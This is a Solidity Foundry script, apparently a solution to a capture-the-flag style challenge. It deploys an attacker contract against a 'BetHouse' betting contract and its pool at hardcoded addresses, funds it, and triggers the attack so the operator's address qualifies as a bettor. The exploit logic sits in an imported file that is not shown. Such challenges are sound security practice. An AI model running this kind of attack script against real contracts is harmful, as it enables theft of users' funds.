// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {BetHouseAttacker} from "../src/attack.sol";

interface IPool {
    function deposit(uint256 value_) external payable;
    function lockDeposits() external;
    function withdrawAll() external;
}

interface IPoolToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IBetHouse {
    function makeBet(address bettor_) external;
    function isBettor(address bettor_) external view returns (bool);
}

contract BetHouseAttackScript is Script {
    address constant BET_HOUSE = 0xFE60537Dd64b805B6B51476aB1a97E8E0525caA6;
    address constant POOL = 0x522fBbBF2580ef74be30aE96b2322Fa59b1F96f1;
    address constant WRAPPED_TOKEN = 0xEc266E2337F7c0A1f3dfc5921eaE4A907F11E281;
    address constant DEPOSIT_TOKEN = 0x8BA164F8573E0F4614fbb92638678fba85cb0d40;
    address constant MY_ADDR = 0x91DcF137f42130E5095558Ee1D143F0282B114B0;
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        
        IPool pool = IPool(POOL);
        IPoolToken depositToken = IPoolToken(DEPOSIT_TOKEN);
        IBetHouse betHouse = IBetHouse(BET_HOUSE);
        BetHouseAttacker attacker = new BetHouseAttacker(POOL, DEPOSIT_TOKEN, BET_HOUSE, WRAPPED_TOKEN);
        
        // Transfer PDT tokens to attacker contract (needed for deposit)
        depositToken.transfer(address(attacker), 5);
        
        attacker.attack{value: 0.001 ether}();
        
        pool.lockDeposits();

        betHouse.makeBet(MY_ADDR);

        vm.stopBroadcast();
    }
}

